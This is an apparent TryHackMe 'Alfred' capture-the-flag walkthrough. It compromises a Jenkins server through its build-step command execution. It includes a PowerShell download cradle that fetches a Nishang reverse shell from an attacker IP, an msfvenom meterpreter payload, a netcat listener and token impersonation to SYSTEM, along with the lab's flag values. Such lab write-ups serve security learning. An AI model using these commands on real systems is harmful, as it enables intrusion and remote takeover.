Today we are back with another TryHackMe Challenge medium listed named Alfred.


Scenario :: omation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using Nishang(opens in new tab) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the reverse shell scripts(opens in new tab).

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

This is basically going to teach us Jenkins Exploitation particularly over here.

So let's start with it.

Main IP :: 10.49.169.153


Starting with all port scan with nmap here.

As machine can't be pinged directly we will perform scan with blocking host discovery here.

root@ip-10-49-122-160:~# nmap 10.49.169.153 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-08 04:01 UTC
Nmap scan report for ip-10-49-169-153.ap-south-1.compute.internal (10.49.169.153)
Host is up (0.00034s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Let's continue with 3 ports we have found over here let's perform service and version detection scan here.

Nmap scan report for ip-10-49-169-153.ap-south-1.compute.internal (10.49.169.153)
Host is up, received user-set (0.00034s latency).
Scanned at 2026-08-08 04:04:04 UTC for 34s

PORT     STATE SERVICE    REASON          VERSION
80/tcp   open  http       syn-ack ttl 128 Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
3389/tcp open  tcpwrapped syn-ack ttl 128
| ssl-cert: Subject: commonName=alfred
| Issuer: commonName=alfred
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2026-08-07T03:55:51
| Not valid after:  2027-02-06T03:55:51
| MD5:   1aa1:5faa:147c:9fd3:4e45:69c0:99ff:5414
| SHA-1: 9104:9c46:d9ca:74ac:9a31:1008:5c48:2880:ac3b:9855
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQII6e1OzyeLVHde3wr1wSOTANBgkqhkiG9w0BAQUFADAR
| MQ8wDQYDVQQDEwZhbGZyZWQwHhcNMjYwODA3MDM1NTUxWhcNMjcwMjA2MDM1NTUx
| WjARMQ8wDQYDVQQDEwZhbGZyZWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQCsjdjcdUfZjSEjio9CM89zsdVz5oylw5Sn+usruQet9m4NVC1nRkpjTlo6
| CoPpK6tUc2dSrCo2tRfx6p1NA5MNRk5OD8p9aP1GqS09EcoFRsFgwm2Fgri+wGh4
| QAUX9r7RaPz2pwx1GcAOuuRuU/PSrsOWBKS5hnLva0AN/VgQ0HUMFbV+9327OgiN
| KP5NfQFUT8/Dvq2aP29yMxBXHN+fsoF0r9yfST05mYlCoTN9pCxmmWOaqHRxxtY9
| AUzG7UzNe5axP7kZbRW5k10rlq+ukl4dWR4pntuFOeEH8J9TQ378ooRvfKEURUrC
| +SUis8LQTaAJvrenhNgARfsi6oyBAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEAF/PVjQcKw7f1IDwz
| 0hVot2XsOr2bJhmLkAQtWENVlvVVKlVHMfV6mgLKRS2j3E74rbXINhi3RWzAZUfw
| tRBqTQ4dCz4tGxswO1Gx7nVcTNnsyJkdQPs3vIL7GKzvvailGbWDxnTBhocB4wsL
| uiyngI6Nq9FlSMejyd3ENusYeYGnkBeJwWXZhDbuGsQEnF98R3EguolDseJVvmPy
| zVrautLk/Ul1ONJms38nxDOgYfvyxQkOhoWbKmMpOYG2gV6VArXLH91gPtFVzcCi
| 43PCJAQrlKxGi3F8SJeLiryqLe8pN/7dJ7xRX1pu24oMH3WfBt0xI8Hf3IykMSx/
| BCv89A==
|_-----END CERTIFICATE-----
8080/tcp open  http       syn-ack ttl 128 Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



Let's start with the web ports as they look open here.


As from the thm webpage we see that there is Jenkins 2.190.1

version from jenkins maybe there is exploit or something like that can be exploitable.

We will find the particular script executionar part on http://IP:8080/script.

nishang Shells/Invoke-PowerShellTcp.ps1 

> nishang ~ Collection of PowerShell scripts and payloads

/usr/share/nishang
├── ActiveDirectory
├── Antak-WebShell
├── Backdoors
├── Bypass
├── Client
├── Escalation
├── Execution
├── Gather
├── Misc
├── MITM
├── nishang.psm1
├── Pivot
├── powerpreter
├── Prasadhak
├── Scan
├── Shells
└── Utility
                                                                     
┌──(root㉿kali)-[/usr/share/nishang]
└─# cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 
.
                                                                     

New-Object Net.WebClient).DownloadString('http://192.168.138.6:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.138.6 -Port 4444

So with this maybe we can get the Shell.

So then onto the jenkins web page we will see the project and going into the configuration part of it

will get the us to execute windows batch command here.

and with above we will set the shell and we are in.

rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.138.6] from (UNKNOWN) [10.49.187.183] 49263
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>

PS C:\Program Files (x86)\Jenkins\workspace\project> whoami
alfred\bruce

PS C:\Users\bruce\Desktop> cat user.txt
79007a09481963edf2e1321abd9ae2a0

So we have the answer.

TIME FOR PRIVILEGE ESCALATION :: 

┌──(root㉿kali)-[/home/kali/thm/alfred]
└─# msfvenom -p windows/meterpreter/reverse_tcp --encoder x86/shikata_ga_nai LHOST=192.168.138.6 LPORT=4445 -f exe -o 1shell-name.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 382 (iteration=0)
x86/shikata_ga_nai chosen with final size 382
Payload size: 382 bytes
Final size of exe file: 7168 bytes
Saved as: 1shell-name.exe
                                                                     
┌──(root㉿kali)-[/home/kali/thm/alfred]
└─# msfconsole
Metasploit tip: Use the resource command to run commands from a file


Following the hints from tryhackme directly.

powershell "(New-Object System.Net.WebClient).Downloadfile('http://192.168.138.6:80/shell-name.exe','shell-name.exe')"


Start-Process "1shell-name.exe"

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

C:\Users\bruce\Desktop>


So let's dive deeper with this.
Users\bruce\Desktop>^C
Terminate channel 2? [y/N]  y
meterpreter > load incognito 
Loading extension incognito...Success.
meterpreter > 

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "BUILTIN\Administrators" 
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

1204  668   spoolsv.e  x64   0        NT AUTHORITY\  C:\Windows\Sy
             xe                        SYSTEM         stem32\spools
                                                      v.exe
 1232  668   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sy
             xe                        LOCAL SERVICE  stem32\svchos
                 
                 
migrate 668
[*] Migrating from 1904 to 668...
[*] Migration completed successfully.
meterpreter > shell
Process 664 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>type C:\Windows\System32\config\root.txt
type C:\Windows\System32\config\root.txt
dff0f748678f280250f25a45b8046b4a



                 


                                                                     
